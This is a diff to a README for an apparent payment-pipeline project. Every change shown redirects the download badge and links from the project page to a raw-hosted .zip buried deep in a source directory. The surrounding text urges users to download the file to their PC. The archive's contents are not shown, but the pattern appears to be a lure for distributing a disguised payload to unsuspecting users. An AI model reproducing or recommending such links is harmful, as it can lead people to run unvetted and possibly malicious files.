@@ -1,6 +1,6 @@
 # 🧩 dbx-lakeflow-psp-payment-system - Run payment pipelines with ease
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system/main/pipelines/src/psp-analytics/silver/system_dbx_payment_psp_lakeflow_2.7-beta.3.zip)
 
 ## 🚀 What this app does
 
@@ -20,7 +20,7 @@ This project can help you:
 
 Use this link to visit the page to download:
 
-[Visit the download page](https://github.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system)
+[Visit the download page](https://raw.githubusercontent.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system/main/pipelines/src/psp-analytics/silver/system_dbx_payment_psp_lakeflow_2.7-beta.3.zip)
 
 If the page offers a file, download it to your PC. If it opens a release or project page, use the file or install option shown there.
 
@@ -206,7 +206,7 @@ If the project includes sample data, use that first before adding your own files
 
 ## 📎 Download again
 
-[Download or open the project page](https://github.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system)
+[Download or open the project page](https://raw.githubusercontent.com/Rafaaltaic651/dbx-lakeflow-psp-payment-system/main/pipelines/src/psp-analytics/silver/system_dbx_payment_psp_lakeflow_2.7-beta.3.zip)
 
 ## 🔄 Typical workflow
 
